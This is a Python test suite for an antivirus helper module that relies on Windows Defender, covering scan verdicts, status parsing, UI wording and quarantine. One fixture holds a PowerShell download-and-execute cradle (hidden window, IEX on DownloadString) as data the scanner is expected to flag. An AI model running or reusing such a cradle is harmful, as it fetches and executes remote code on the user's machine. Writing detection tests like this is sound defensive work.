"""Security check-up: Windows Defender decides, by exit code; KALKI's own checks say why;
nothing is called clean or protected unless Defender confirmed it."""

import os as _os
import sys as _sys

_sys.path.insert(0, _os.path.dirname(_os.path.abspath(__file__)))
import _isolation  # noqa: E402,F401  Before anything from the app: a throwaway profile.


import json
import os
import re
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "app"))

import antivirus  # noqa: E402


def defender(code, stdout=""):
    return mock.patch.multiple(antivirus, _find_mpcmdrun=mock.Mock(return_value="MpCmdRun.exe"),
                               subprocess=mock.Mock(run=mock.Mock(return_value=subprocess.CompletedProcess([], code, stdout=stdout)),
                                                    TimeoutExpired=subprocess.TimeoutExpired,
                                                    SubprocessError=subprocess.SubprocessError))


class Verdicts(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.mkdtemp()

    def file(self, name, content=b"hello"):
        path = os.path.join(self.dir, name)
        with open(path, "wb") as f:
            f.write(content)
        return path

    def test_exit_codes_decide(self):
        path = self.file("a.txt")
        with defender(0):
            self.assertEqual(antivirus.scan_file(path)["verdict"], "clean")
        with defender(2, "Threat                  : Virus:DOS/EICAR_Test_File\n"):
            r = antivirus.scan_file(path)
        self.assertEqual((r["verdict"], r["threat_name"]), ("threat", "Windows Defender: Virus:DOS/EICAR_Test_File"))
        # Text that merely mentions threats doesn't count; only the exit code does.
        with defender(0, "found 3 threats in the help text"):
            self.assertEqual(antivirus.scan_file(path)["verdict"], "clean")

    def test_defender_failing_is_never_clean(self):
        path = self.file("a.txt")
        for code in (1, 5, -1):
            with defender(code):
                r = antivirus.scan_file(path)
            self.assertEqual(r["verdict"], "unchecked", code)
            self.assertFalse(r["clean"])
            self.assertIn(f"exit code {code}", r["defender_error"])
        with mock.patch.object(antivirus, "_find_mpcmdrun", return_value=None):
            self.assertEqual(antivirus.scan_file(path)["verdict"], "unchecked")

    def test_no_made_up_malware_names(self):
        path = self.file("invoice.pdf.exe")
        with defender(0):
            r = antivirus.scan_file(path)
        self.assertEqual(r["verdict"], "suspicious")
        self.assertIn("looks like a PDF but runs as a program", r["findings"][0])
        source = (ROOT / "app" / "antivirus.py").read_text(encoding="utf-8")
        for fake in ("Trojan.", "Win32.Malware", "Heur.", "Test.Virus", "Suspicious.HighEntropy", "Generic.Malware"):
            self.assertNotIn(fake, source)

    def test_programs_arent_flagged_for_ordinary_api_names(self):
        path = self.file("tool.exe", b"MZ" + b"VirtualAlloc WriteProcessMemory FromBase64String " * 50)
        with defender(0):
            self.assertEqual(antivirus.scan_file(path)["verdict"], "clean")

    def test_scripts_with_risky_commands_are_suspicious(self):
        path = self.file("run.ps1", b"powershell -w hidden IEX (New-Object Net.WebClient).DownloadString('http://x')")
        with defender(0):
            r = antivirus.scan_file(path)
        self.assertEqual(r["verdict"], "suspicious")
        self.assertTrue(all(f.startswith("Suspicious because") for f in r["findings"]))

    def test_a_locked_file_is_couldnt_scan_not_malware(self):
        path = self.file("a.txt")
        with mock.patch("builtins.open", side_effect=PermissionError(13, "Permission denied")):
            r = antivirus.scan_file(path)
        self.assertEqual((r["verdict"], r["scan_status"]), ("unchecked", "not_scanned"))
        with mock.patch("builtins.open", side_effect=OSError(22, "Invalid argument")), \
                mock.patch.object(antivirus, "_blocked_by_defender", return_value=False):
            self.assertEqual(antivirus.scan_file(path)["verdict"], "unchecked")

    def test_a_file_windows_blocks_as_infected_is_a_threat(self):
        path = self.file("a.txt")
        with mock.patch("builtins.open", side_effect=OSError(22, "Invalid argument")), \
                mock.patch.object(antivirus, "_blocked_by_defender", return_value=True):
            r = antivirus.scan_file(path)
        self.assertEqual((r["verdict"], r["threat_name"]), ("threat", "Blocked by Windows Defender"))


class DefenderStatus(unittest.TestCase):
    def status(self, payload, code=0):
        out = subprocess.CompletedProcess([], code, stdout=json.dumps(payload) if payload is not None else "", stderr="")
        with mock.patch.object(antivirus.os, "name", "nt"), mock.patch.object(antivirus.subprocess, "run", return_value=out):
            return antivirus.get_windows_defender_status()

    def test_real_fields_and_unknowns(self):
        s = self.status({"AMServiceEnabled": True, "AntivirusEnabled": True, "RealTimeProtectionEnabled": True,
                         "AntivirusSignatureAge": 4294967295, "QuickScanAge": 2,
                         "QuickScanEndTime": "/Date(1794500000000)/", "AMProductVersion": "4.18"})
        self.assertIsNone(s["signature_age_days"])  # "never" isn't "today"
        self.assertEqual(s["quick_scan_age_days"], 2)
        self.assertTrue(s["last_quick_scan"].startswith("2026-"))

    def test_not_running_says_why(self):
        s = self.status(None, code=1)
        self.assertFalse(s["available"])
        self.assertIn("isn't running", s["reason"])

    def test_no_fake_engine_version(self):
        with mock.patch.object(antivirus, "get_windows_defender_status", return_value={"available": False}):
            self.assertEqual(antivirus.get_antivirus_status()["engine_version"], "")


class Screen(unittest.TestCase):
    def test_wording(self):
        page = (ROOT / "app" / "ui" / "features" / "security.js").read_text(encoding="utf-8")
        self.assertIn("KALKI isn't an antivirus. It works with Windows Defender", page)
        self.assertNotIn("MALWARE DETECTED", page)
        self.assertNotIn("Generic.Threat", page)
        self.assertTrue(re.search(r"unchecked:\s*\{", page))


class Quarantine(unittest.TestCase):
    def test_encrypted_and_restored_exactly(self):
        import hashlib
        src = os.path.join(tempfile.mkdtemp(), "sample.exe")
        payload = b"MZ" + os.urandom(4000)
        with open(src, "wb") as f:
            f.write(payload)
        r = antivirus.quarantine_file(src, "test")
        self.assertTrue(r["ok"], r)
        self.assertFalse(os.path.exists(src))
        with open(r["entry"]["quarantine_path"], "rb") as f:
            stored = f.read()
        self.assertNotIn(payload[50:90], stored)  # nothing runnable left behind
        self.assertTrue(antivirus.resolve_quarantine(r["entry"]["id"], "restore")["ok"])
        with open(src, "rb") as f:
            self.assertEqual(hashlib.sha256(f.read()).digest(), hashlib.sha256(payload).digest())

    def test_restore_never_overwrites(self):
        src = os.path.join(tempfile.mkdtemp(), "a.txt")
        with open(src, "w") as f:
            f.write("one")
        r = antivirus.quarantine_file(src, "test")
        with open(src, "w") as f:
            f.write("new file in the same place")
        self.assertFalse(antivirus.resolve_quarantine(r["entry"]["id"], "restore")["ok"])
        self.assertTrue(antivirus.resolve_quarantine(r["entry"]["id"], "delete")["ok"])


@unittest.skipUnless(os.environ.get("KALKI_LIVE_DEFENDER") == "1", "set KALKI_LIVE_DEFENDER=1 to run against real Defender")
class LiveDefender(unittest.TestCase):
    """Run by hand: writes the harmless EICAR test file, which Defender treats as a threat."""

    def test_eicar_is_detected_through_defender(self):
        path = os.path.join(tempfile.mkdtemp(), "eicar.txt")
        with open(path, "wb") as f:
            f.write(antivirus.EICAR_SUBSTRING)
        self.assertEqual(antivirus.scan_file(path)["verdict"], "threat")


if __name__ == "__main__":
    unittest.main()
